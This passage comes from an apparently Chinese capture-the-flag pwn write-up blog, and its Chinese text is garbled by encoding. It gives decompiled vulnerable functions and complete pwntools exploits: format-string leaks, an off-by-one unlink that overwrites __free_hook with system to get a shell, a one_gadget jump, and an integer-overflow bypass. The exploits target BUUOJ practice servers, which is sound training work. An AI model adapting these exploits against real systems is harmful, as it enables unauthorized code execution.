function_">banner</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> format[<span class="number">12</span>]; <span class="comment">// [rsp+Ch] [rbp-14h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Welcome to note management system!&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%s&quot;</span>, format);                 <span class="comment">// ä¸€ä¸ªæ ˆæº¢å‡º</span></span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Hello, &quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(format);                               <span class="comment">// æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´</span></span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;\n-------------------------------------&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>bannerå‡½æ•°ä¸­æœ‰ä¸€ä¸ªæ ˆæº¢å‡ºå’Œæ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´ï¼Œä½†æ˜¯ç”±äºCanaryçš„ä¿æŠ¤ï¼Œä»–æ˜¯æ— æ³•è¿›è¡Œæ ˆæº¢å‡ºçš„ï¼Œå› æ­¤åªèƒ½æ³„éœ²äº†ï¼Œè€Œæ³„éœ²çš„è¯ä¸€æ¬¡æ€§æ³„éœ²codeåŸºå€å’ŒlibcåŸºå€</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> __int64 <span class="title function_">add_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> size; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> index; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter the index you want to create (0-10):&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;index);</span><br><span class="line">  <span class="keyword">if</span> ( index &lt; <span class="number">0xB</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( counts &gt; <span class="number">0xA</span>u )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;full!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Enter a size:&quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;size);</span><br><span class="line">    <span class="keyword">if</span> ( key == <span class="number">43</span> )                            <span class="comment">// ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ”¹keyä¸º43</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Enter the content: &quot;</span>);</span><br><span class="line">      v0 = index;</span><br><span class="line">      *((_QWORD *)&amp;note + <span class="number">2</span> * (<span class="type">int</span>)v0) = <span class="built_in">malloc</span>(size);</span><br><span class="line">      *((_DWORD *)&amp;note + <span class="number">4</span> * (<span class="type">int</span>)index + <span class="number">2</span>) = size;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_QWORD *)&amp;note + <span class="number">2</span> * (<span class="type">int</span>)index) )</span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;error&quot;</span>, <span class="number">1uLL</span>, <span class="number">5uLL</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                        <span class="comment">// ä¸æ”¹keyåªèƒ½è¿›è¡Œè¿™ä¸ª</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( size &lt;= <span class="number">0x80</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t hack me!&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Enter the content: &quot;</span>);</span><br><span class="line">      v1 = index;</span><br><span class="line">      *((_QWORD *)&amp;note + <span class="number">2</span> * (<span class="type">int</span>)v1) = <span class="built_in">malloc</span>(size);</span><br><span class="line">      *((_DWORD *)&amp;note + <span class="number">4</span> * (<span class="type">int</span>)index + <span class="number">2</span>) = size;</span><br><span class="line">      <span class="keyword">if</span> ( !*((_QWORD *)&amp;note + <span class="number">2</span> * (<span class="type">int</span>)index) )</span><br><span class="line">      &#123;</span><br><span class="line">        fwrite(<span class="string">&quot;error&quot;</span>, <span class="number">1uLL</span>, <span class="number">5uLL</span>, <span class="built_in">stderr</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( !(<span class="type">unsigned</span> <span class="type">int</span>)check_pass((<span class="type">char</span> *)&amp;note + <span class="number">16</span> * (<span class="type">int</span>)index) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;go out!hacker!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    get_input(*((_QWORD *)&amp;note + <span class="number">2</span> * (<span class="type">int</span>)index), size);<span class="comment">// off by one</span></span><br><span class="line">    ++counts;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Done!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;You can&#x27;t hack me!&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readfsqword(<span class="number">0x28</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶ä¸­æ¼æ´ç‚¹åœ¨äºget_inputå‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span> __fastcall <span class="title function_">get_input</span><span class="params">(__int64 a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">size_t</span> result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">signed</span> <span class="type">int</span> v3; <span class="comment">// [rsp+10h] [rbp-10h]</span></span><br><span class="line">  _BYTE *v4; <span class="comment">// [rsp+18h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = (_BYTE *)(v3 + a1);</span><br><span class="line">    result = fread(v4, <span class="number">1uLL</span>, <span class="number">1uLL</span>, <span class="built_in">stdin</span>);</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">int</span>)result &lt;= <span class="number">0</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    <span class="keyword">if</span> ( *v4 == <span class="string">&#x27;\n&#x27;</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v3 )</span><br><span class="line">      &#123;</span><br><span class="line">        result = v3 + a1;</span><br><span class="line">        *v4 = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      result = (<span class="type">unsigned</span> <span class="type">int</span>)++v3;</span><br><span class="line">      <span class="keyword">if</span> ( a2 + <span class="number">1</span> &lt;= (<span class="type">unsigned</span> <span class="type">int</span>)v3 )         <span class="comment">// off by oneï¼Œå†™äº†a2+1ä¸ªå­—èŠ‚</span></span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¸€ä¸ªoff-by-one</p><p>è¿™æ ·è¿˜æœ‰editï¼Œdeleteå¯ä»¥æœ‰æ€è·¯å³unlinkæ”¹free_hookä¸ºsystemï¼Œä¹‹åfree(â€˜&#x2F;bin&#x2F;sh\x00â€™)å³å¯ï¼ˆä½†æ˜¯å¥½åƒ(lllï¿¢Ï‰ï¿¢)keyæ²¡ç”¨åˆ°ï¼‰</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./axb&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">27457</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line"></span><br><span class="line">p=run()</span><br><span class="line">pal=<span class="string">b&#x27;%15$p.%19$p&#x27;</span></span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">sla(<span class="string">&#x27;Enter your name: &#x27;</span>,pal)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">ru(<span class="string">&#x27;Hello, 0x&#x27;</span>)</span><br><span class="line"><span class="comment">#data=p64(int(r(12),16))</span></span><br><span class="line">start_main=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">ru(<span class="string">&#x27;.0x&#x27;</span>)</span><br><span class="line">bss_addr=<span class="built_in">int</span>(r(<span class="number">12</span>),<span class="number">16</span>)-<span class="number">0x116a</span>+<span class="number">0x202000</span></span><br><span class="line">leak(<span class="string">&#x27;bss_addr&#x27;</span>,bss_addr)</span><br><span class="line">leak(<span class="string">&#x27;start_main&#x27;</span>,start_main)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">libc_base=start_main-<span class="number">0x20830</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">system_addr=libc_base+<span class="number">0x45390</span></span><br><span class="line">free_hook=libc_base+<span class="number">0x3C67A8</span></span><br><span class="line">leak(<span class="string">&#x27;free_hook&#x27;</span>,free_hook)</span><br><span class="line">leak(<span class="string">&#x27;system&#x27;</span>,system_addr)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Enter the index you want to create (0-10):&#x27;</span>,tbs(index))</span><br><span class="line">    sla(<span class="string">&#x27;Enter a size:\n&#x27;</span>,tbs(size))</span><br><span class="line">    sla(<span class="string">&#x27;Enter the content: \n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Enter an index:\n&#x27;</span>,tbs(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">index,content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;&gt;&gt; &#x27;</span>,<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Enter an index:\n&#x27;</span>,tbs(index))</span><br><span class="line">    sla(<span class="string">&#x27;Enter the content: \n&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="comment">#enter size&gt;0x80 else exit</span></span><br><span class="line">note_addr=bss_addr+<span class="number">0x60</span></span><br><span class="line">fake_fd=note_addr-<span class="number">0x8</span></span><br><span class="line">fake_bk=note_addr</span><br><span class="line">pal=p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)+p64(fake_fd)+p64(fake_bk)+p64(<span class="number">0</span>)*<span class="number">14</span>+p64(<span class="number">0x90</span>)+<span class="string">b&#x27;\xa0&#x27;</span></span><br><span class="line">add(<span class="number">0</span>,<span class="number">0x98</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x98</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x98</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>,<span class="number">0x98</span>,<span class="string">b&#x27;s1nec-1o&#x27;</span>)</span><br><span class="line">edit(<span class="number">1</span>,pal)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">5</span>,<span class="number">0x98</span>,<span class="string">b&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">pal=p64(<span class="number">0</span>)+p64(free_hook)+p64(<span class="number">0x98</span>)</span><br><span class="line">edit(<span class="number">1</span>,pal)</span><br><span class="line">edit(<span class="number">0</span>,p64(system_addr))</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line">debug()</span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><h1 id="oneshot-tjctf-2016"><a href="#oneshot-tjctf-2016" class="headerlink" title="oneshot_tjctf_2016"></a>oneshot_tjctf_2016</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653177.png" alt="image-20240508205504223" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 (*v4)(<span class="type">void</span>); <span class="comment">// [rsp+8h] [rbp-8h] BYREF</span></span><br><span class="line"></span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Read location?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Value: 0x%016lx\n&quot;</span>, *(_QWORD *)v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Jump location?&quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%ld&quot;</span>, &amp;v4);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Good luck!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> v4();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>æ³¨æ„ï¼šlong intåœ¨linuxæ˜¯8å­—èŠ‚çš„ï¼Œåœ¨windowsæ˜¯4å­—èŠ‚çš„ï¼ˆæ— è®º32 or 64ï¼‰</p></blockquote><p>è¿™é‡Œé¦–å…ˆæ˜¯è®©æˆ‘ä»¬è¾“å…¥v4çš„å€¼ç„¶åæ³„éœ²v4ä½œä¸ºåœ°å€å…¶ä¸Šå†…å®¹çš„å€¼ï¼Œä¹‹åè¿˜èƒ½å†æ¬¡è¾“å…¥v4çš„å€¼ï¼Œä¹‹åä»¥v4ä¸ºå‡½æ•°åŸºå€æ‰§è¡Œå‡½æ•°ï¼Œå°±æƒ³åˆ°é¦–å…ˆå…ˆæ³„éœ²libcç„¶åæ‰§è¡Œone_gadgetï¼ˆå±å®å¯ä¾›æ“æ§çš„å†…å®¹è¾ƒå°‘åªèƒ½è¯•è¯•çœ‹</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">path=<span class="string">&#x27;./oneshot&#x27;</span></span><br><span class="line">elf=ELF(path)</span><br><span class="line"></span><br><span class="line">r   =<span class="keyword">lambda</span> num=<span class="number">4096</span>:p.recv(num)</span><br><span class="line">ru  =<span class="keyword">lambda</span> content,drop=<span class="literal">False</span>:p.recvuntil(content,drop)</span><br><span class="line">rl  =<span class="keyword">lambda</span> :p.recvline()</span><br><span class="line">sla =<span class="keyword">lambda</span> flag,content:p.sendlineafter(flag,content)</span><br><span class="line">sa  =<span class="keyword">lambda</span> flag,content:p.sendafter(flag,content)</span><br><span class="line">sl  =<span class="keyword">lambda</span> content:p.sendline(content)</span><br><span class="line">s   =<span class="keyword">lambda</span> content:p.send(content)</span><br><span class="line">irt =<span class="keyword">lambda</span> :p.interactive()</span><br><span class="line">tbs =<span class="keyword">lambda</span> content:<span class="built_in">str</span>(content).encode()</span><br><span class="line">leak=<span class="keyword">lambda</span> name,addr :info(<span class="string">f&#x27;<span class="subst">&#123;name&#125;</span>====&gt;<span class="subst">&#123;<span class="built_in">hex</span>(addr)&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local=<span class="number">0</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run</span>():</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">return</span> process(path)</span><br><span class="line">    <span class="keyword">return</span> remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26690</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>(<span class="params">duan=<span class="number">0</span></span>):</span><br><span class="line">    <span class="keyword">if</span> local:</span><br><span class="line">        <span class="keyword">if</span> duan:</span><br><span class="line">            gdb.attach(p,duan)</span><br><span class="line">            pause()</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        gdb.attach(p)</span><br><span class="line">        pause()</span><br><span class="line">p=run()</span><br><span class="line">puts_got=elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">sla(<span class="string">&#x27;Read location?\n&#x27;</span>,<span class="built_in">str</span>(puts_got))</span><br><span class="line">ru(<span class="string">&#x27;Value: 0x&#x27;</span>)</span><br><span class="line">puts_addr=<span class="built_in">int</span>(r(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">leak(<span class="string">&#x27;puts_addr&#x27;</span>,puts_addr)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">libc_base=puts_addr-<span class="number">0x6F690</span></span><br><span class="line">leak(<span class="string">&#x27;libc_base&#x27;</span>,libc_base)</span><br><span class="line">one_gadget=libc_base+<span class="number">0x45216</span> <span class="comment">#0x45216 0x4526a 0xf02a4 0xf1147</span></span><br><span class="line">sla(<span class="string">&#x27;Jump location?\n&#x27;</span>,<span class="built_in">str</span>(one_gadget))</span><br><span class="line"></span><br><span class="line">irt()</span><br></pre></td></tr></table></figure><p>ä¹Ÿç®—æ˜¯è¿æ°”ä¸é”™ï¼Œä¸€æŠŠè¿‡</p><h1 id="wustctf2020-number-game"><a href="#wustctf2020-number-game" class="headerlink" title="wustctf2020_number_game"></a>wustctf2020_number_game</h1><img src="https://cdn.jsdelivr.net/gh/s1nec-1o/photo@main/img/202405121653178.png" alt="image-20240508213032791" style="zoom:50%;" /><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">vulnerable</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &gt;= <span class="number">0</span> || (v1 = -v1, v1 &gt;= <span class="number">0</span>) )</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;You lose&quot;</span>);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    shell();</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æœ¬é¢˜è¦ç»•è¿‡ç¬¬ä¸€ä¸ªifç„¶åå°±èƒ½å®ç°shelläº†ï¼Œé‚£ç»•è¿‡å˜æˆäº†å›°éš¾ï¼Œé¦–å…ˆv1æ˜¯intå‹èŒƒå›´åœ¨-2147483648~2147483647ä¹‹é—´ï¼Œé‚£ä¹ˆå¦‚æœå–-2147483648ä»–çš„åŸç æ˜¯0x80000000ï¼Œè€Œå–åæ˜¯å–è¡¥ç ç„¶å+1ï¼Œæ‰€ä»¥ä»–çš„è¡¥ç ä¹Ÿæ˜¯0x80000000ï¼Œå°±èƒ½å®ç°shell</p><h1 id="starctf-2019-babyshell"><a href="#starctf-2019-babyshell" 